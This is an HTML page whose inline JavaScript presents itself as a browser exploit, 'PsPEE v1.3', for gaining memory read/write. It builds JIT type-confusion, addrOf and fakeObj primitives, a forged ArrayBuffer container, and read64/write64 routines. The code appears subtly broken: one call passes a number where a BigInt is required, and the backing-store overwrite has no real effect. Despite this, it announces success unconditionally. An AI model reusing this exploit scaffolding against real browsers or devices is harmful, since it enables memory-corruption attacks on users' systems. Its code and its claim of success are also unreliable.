<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: black; color: lime; font-family: monospace; }
        #log { white-space: pre-wrap; }
    </style>
</head>
<body>
    <div id="log"></div>
    <script>
        const log = msg => logDiv.textContent += msg + "\n";
        const logDiv = document.getElementById("log");

        const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
        const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];

        log("[*] PsPEE v1.3 - Memory R/W Setup");

        // Type confusion exploit
        let float_arr = [1.1, 2.2, 3.3];
        let obj_arr = [{}, {}, {}];

        function confuse(o) {
            let tmp = [1.1, 2.2, 3.3];
            tmp[1] = o;
            return tmp[1];
        }

        for (let i = 0; i < 10000; i++) confuse(2.2);

        // addrOf
        function addrOf(obj) {
            try {
                obj_arr[0] = obj;
                let result = f2i(confuse(obj_arr));
                log("[DEBUG] addrOf result: " + result.toString(16));
                return result;
            } catch (e) {
                log("[ERROR] addrOf failed: " + e.message);
                return null;
            }
        }

        // fakeObj
        function fakeObj(addr) {
            try {
                float_arr[0] = i2f(addr);
                let result = confuse(float_arr);
                log("[DEBUG] fakeObj result: " + result);
                return result;
            } catch (e) {
                log("[ERROR] fakeObj failed: " + e.message);
                return null;
            }
        }

        log("[*] Creating primitives...");

        // Setup memory
        let ab = new ArrayBuffer(0x100);
        let ab_addr = addrOf(ab);
        if (ab_addr !== null) {
            log("[+] ArrayBuffer @ " + ab_addr.toString(16));
        } else {
            log("[ERROR] Failed to get ArrayBuffer address.");
        }

        // Read its backing store
        let dv = new DataView(ab);
        let container;

        try {
            container = {
                jsCellHeader: i2f(0x0108200700000000n), // JSObject cell
                butterfly: ab_addr,                    // Simulate valid
                vectorLength: i2f(0x100),
                backingStore: i2f(ab_addr + 0x20n),    // Offset to real backingStore
                fake: ab
            };
            log("[DEBUG] Container created: " + JSON.stringify(container));
        } catch (e) {
            log("[ERROR] Failed to create container: " + e.message);
            container = null;
        }

        if (container !== null) {
            let containerAddr = addrOf(container);
            if (containerAddr !== null) {
                log("[+] Fake container @ " + containerAddr.toString(16));
            } else {
                log("[ERROR] Failed to get container address.");
            }

            // Create fake backing ArrayBuffer
            let fakeAb = fakeObj(containerAddr + 0x20n);
            if (fakeAb === null) {
                log("[ERROR] Failed to create fake ArrayBuffer.");
            }
        } else {
            log("[ERROR] Container setup failed, skipping further operations.");
        }

        // R/W primitives
        function read64(addr) {
            try {
                container.backingStore = i2f(addr);
                let result = f2i(dv.getFloat64(0, true));
                log("[DEBUG] read64 result: " + result.toString(16));
                return result;
            } catch (e) {
                log("[ERROR] read64 failed: " + e.message);
                return null;
            }
        }

        function write64(addr, val) {
            try {
                container.backingStore = i2f(addr);
                dv.setFloat64(0, i2f(val), true);
                log("[DEBUG] write64: Written value " + val.toString(16) + " to address " + addr.toString(16));
            } catch (e) {
                log("[ERROR] write64 failed: " + e.message);
            }
        }

        // Test
        let obj = {a: 13.37};
        let objAddr = addrOf(obj);
        if (objAddr !== null) {
            log("[+] Object @ " + objAddr.toString(16));
        } else {
            log("[ERROR] Failed to get object address.");
        }

        let leak = read64(objAddr);
        if (leak !== null) {
            log("[+] Leak: " + leak.toString(16));
        } else {
            log("[ERROR] Failed to leak object.");
        }

        log("[*] You now have memory R/W access!");
    </script>
</body>
</html>
